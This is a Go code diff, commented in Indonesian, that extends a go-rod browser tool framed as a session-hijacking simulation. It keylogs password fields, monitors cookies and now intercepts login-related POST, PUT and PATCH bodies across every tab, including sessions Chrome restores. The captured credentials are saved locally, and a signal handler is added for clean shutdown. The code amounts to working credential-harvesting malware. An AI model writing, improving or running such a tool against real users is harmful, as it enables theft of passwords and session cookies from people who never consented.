@@ -5,8 +5,10 @@ import (
 	"fmt"
 	"log"
 	"os"
+	"os/signal"
 	"path/filepath"
 	"strings"
+	"syscall"
 	"time"
 
 	"github.com/go-rod/rod"
@@ -66,22 +68,37 @@ func main() {
 	browser := rod.New().ControlURL(u).MustConnect()
 	defer browser.MustClose()
 
+	// Tangkap signal Ctrl+C untuk close browser dengan bersih agar tidak menjadi zombie process
+	// Ini penting karena jika program dihentikan dengan Leakless(false), chrome tidak otomatis tertutup
+	c := make(chan os.Signal, 1)
+	signal.Notify(c, os.Interrupt, syscall.SIGTERM)
+	go func() {
+		<-c
+		fmt.Println("\n[!] Mematikan browser dan membersihkan session...")
+		browser.MustClose()
+		os.Exit(0)
+	}()
+
 	fmt.Println("Browser terbuka. Silakan interaksi / login ke aplikasi web target...")
 	fmt.Println("Script ini akan memantau cookie untuk simulasi session hijacking.")
 	fmt.Println("Tekan Ctrl+C untuk berhenti monitoring.")
 
-	// Navigasi ke target
-	// Ganti dengan URL aplikasi yang ingin ditest
-	url := "https://example.com" // Contoh default, bisa diganti
-	page := browser.MustPage(url)
+	// Biarkan user mengetik sendiri atau melanjutkan session yang direstore otomatis oleh Chrome.
+	// Kita ambil daftar tab yang aktif saat ini.
+	pages, _ := browser.Pages()
+	var page *rod.Page
+	if len(pages) > 0 {
+		page = pages[0]
+	} else {
+		// Fallback jika tidak ada tab sama sekali, buka tab kosong
+		page = browser.MustPage("")
+	}
 
-	page.MustWaitLoad()
-
-	// Monitor input fields (seperti keylogger sederhana pada field password)
+	// Monitor input fields (seperti keylogger sederhana pada field password) untuk tab awal
 	go monitorInputFields(page, homeDir)
 	
-	// Monitor network request POST untuk menangkap form submission
-	go monitorNetworkRequests(page, homeDir)
+	// Monitor network request POST untuk menangkap form submission di level browser (seluruh tab)
+	go monitorNetworkRequests(browser, homeDir)
 
 	// Monitor cookies secara berkala
 	monitorCookies(browser, homeDir)
@@ -136,22 +153,23 @@ func monitorInputFields(page *rod.Page, homeDir string) {
 	}
 }
 
-func monitorNetworkRequests(page *rod.Page, homeDir string) {
-	router := page.Browser().HijackRequests()
+func monitorNetworkRequests(browser *rod.Browser, homeDir string) {
+	router := browser.HijackRequests()
 	defer router.MustStop()
 
 	router.MustAdd("*", func(ctx *rod.Hijack) {
-		req := ctx.Request.Req()
+		req := ctx.Request
+		httpReq := req.Req()
 		
 		// Deteksi request POST, PUT, atau PATCH yang biasa dipakai login
-		method := req.Method
+		method := httpReq.Method
 		if method == "POST" || method == "PUT" || method == "PATCH" {
-			url := req.URL
+			urlStr := httpReq.URL.String()
 			
-			// Cek apakah ada post data
-			if req.HasPostData {
-				postData := req.PostData
-				
+			// Dapatkan payload POST/PUT
+			postData := req.Body()
+			
+			if postData != "" {
 				// Deteksi keyword yang berhubungan dengan login/auth
 				lowerData := strings.ToLower(postData)
 				if strings.Contains(lowerData, "password") || 
@@ -161,10 +179,10 @@ func monitorNetworkRequests(page *rod.Page, homeDir string) {
 				   strings.Contains(lowerData, "login") ||
 				   strings.Contains(lowerData, "auth") {
 					
-					fmt.Printf("\n[!] Potensi Data Login Tersadap (Request POST ke %s)!\n", truncateString(url, 50))
+					fmt.Printf("\n[!] Potensi Data Login Tersadap (Request POST ke %s)!\n", truncateString(urlStr, 50))
 					
 					cred := CredentialData{
-						URL:  url,
+						URL:  urlStr,
 						Type: "network-request",
 						Data: postData,
 						Time: time.Now(),
